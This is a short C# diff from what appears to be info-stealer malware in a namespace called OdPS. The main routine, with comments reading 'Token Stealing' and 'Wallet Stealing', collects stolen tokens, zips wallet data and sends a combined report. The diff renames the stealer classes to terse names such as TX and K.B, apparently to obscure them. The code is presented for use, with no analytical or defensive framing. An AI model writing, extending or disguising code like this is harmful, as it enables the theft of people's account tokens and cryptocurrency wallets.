@@ -2,7 +2,8 @@ using System;
 using System.Collections.Generic; // Required for List<string>
 using System.Threading.Tasks; // Required for Task
 using System.IO; // Required for File.Delete
-using PublicStealer.wallet;
+using H.DV;
+using DataHarvester;
 
 namespace OdPS
 {
@@ -17,13 +18,13 @@ namespace OdPS
             try
             {
                 // Token Stealing
-                var stolenTokens = TokenExtractor.GetTokens();
+                var stolenTokens = TX.GetTokens();
 
                 // Wallet Stealing
-                walletZipPath = await WalletStealer.SAndZipW();
+                walletZipPath = await K.B();
 
                 // Send Combined Report
-                await WHS.SendCombinedReport(stolenTokens, walletZipPath);
+                await ReportSender.SendCombinedReport(stolenTokens, walletZipPath);
             }
             catch
             {
